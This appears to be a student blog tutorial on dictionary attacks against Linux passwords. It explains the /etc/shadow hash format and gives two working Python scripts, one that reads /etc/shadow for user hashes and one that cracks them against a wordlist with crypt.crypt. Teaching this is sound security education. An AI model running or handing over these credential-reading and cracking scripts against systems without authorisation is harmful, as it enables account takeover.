---
layout: post
title: "Spring Blog 2: Dictionary Attack in Python"
---

An alternative to the Brute Force is a Dictionary Attack. With this attack, we will use a word list (a dictionary) and apply each one of those words to see if they match a password in Linux. BUT, there's a catch...

Linux, or any secure OS or application for that matter, doesn't store passwords in plaintext. Instead, passwords are hashed, and the hash is stored on the system instead. Also, hashes can not be reverse engineered, so we can't really write a script to reverse the hash and find a plaintext password. These hashes are stored in /etc/shadow. Let's take a look at a sample user in the /etc/shadow file:

**root:$6$KjuD.NJOE.5mJmev$ff/DvQCgsOeM9By4hGeOnfyjQdk97qe0BCtvnsBrSDHYLMIib17gHP4yJm.KLdCbalntGvTX8bxcbBT6dGPO0:18690:0:99999:7:::**

The information before the second colon is what we need. Here we have $user:$hash. Specifically, we need the hash to make this work out, so let's examine the hash.

**$6$KjuD.NJOE.5mJmev$ff/DvQCgsOeM9By4hGeOnfyjQdk97qe0BCtvnsBrSDHYLMIib17gHP4yJm.KLdCbalntGvTX8bxcbBT6dGPO0**

Notice the 3 dollar signs, these are important. The $6 signifies the hashing algorithm (SHA-512 in this case). The next dollar signs marks the beginning of the **salt** characters, which are characters added to the hash for extra security. The last dollar sign marks the rest of the hash. So in order to test a hash, we need to do the following:

- Extract the salt value: $[number]$[salt characters]$[rest of hash]
- Use a hashing tool (in this case, we will be using crypt.crypt() in Python)
- Use a dictionary to test every single word to check for a match

I wrote the following scripts myself. The first script will take an /etc/shadow file, find users with hashes (with current passwords), and remove any unnecessary information:

	
	shadow = open("/etc/shadow", "r")

	newfile = ""

	for line in shadow:
	    x = line.split(":", 5)
	    if x[1].startswith('$'):
		newfile += x[0] + ":" + x[1] + "\n"
	    else:
		continue

	print(newfile)
	
The next script will break down the hashes, extract the salt values, hash each word with crypt.crypt([$word], [$salt]), and test each word from our wordlist (ours is called dictionary.txt):

	import crypt


	dictionaryFile = open("/root/Documents/dictionary.txt", "r")
	line = dictionaryFile.read().splitlines()

	hashesFile = open("/root/Documents/hashes.txt", "r")
	hashLine = hashesFile.read().splitlines() 
	userPlusPassword = ""

	for x in hashLine:
	    if x == "":
		break
	    else:
		username = x.split(':')[0]
		hashp = x.split(':')[1]

		salt = hashp.split('$')[0] + "$" + hashp.split('$')[1] + "$" + hashp.split('$')[2] + "$"

		for y in line:
		    testWord = crypt.crypt( y , salt )
		    if testWord == hashp:
			userPlusPassword += (username + ":" + y + "\n")

		    else:
			continue

	print(userPlusPassword)
	
For a list of 5 passwords and a list of 1000000 possible choices in the dictionary, this took about 7 minutes to crack. You can modify these scripts to use whatever files you would like to use. Just remember to redirect the output from the first script to a hash file (that would be hashes.txt in my case), and you can use the second script above to perform a dictionary attack.
